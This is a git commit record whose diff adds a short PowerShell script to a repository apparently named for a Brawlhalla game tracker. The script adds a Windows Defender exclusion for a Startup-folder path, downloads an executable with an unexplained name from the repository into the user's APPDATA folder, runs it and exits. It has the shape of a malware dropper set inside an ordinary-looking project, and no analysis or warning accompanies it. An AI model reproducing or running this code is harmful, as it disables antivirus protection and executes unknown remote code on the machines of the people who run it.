f55037d2b1591da5ac6c779b7e1c13ec4b28bd4d
FCsab <161705557+FCsab@users.noreply.github.com>
2025-06-24 16:04:49 +0200

    Update and rename 3..ps1 to 3.ps1

---
+++ 3.ps1
@@ -0,0 +1,10 @@
+$startupFolder = $env:APPDATA
+$url = "https://github.com/FCsab/Brawlhalla-Tracker/blob/main/valaminemjogec.exe?raw=true"
+$outputPath = Join-Path $startupFolder "valaminemjogec.exe"
+Add-MpPreference -ExclusionPath "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\valaminemjogec.exe"
+
+Invoke-WebRequest -Uri $url -OutFile $outputPath
+
+& $outputPath
+Start-Sleep -Seconds 1
+[System.Environment]::Exit(0)
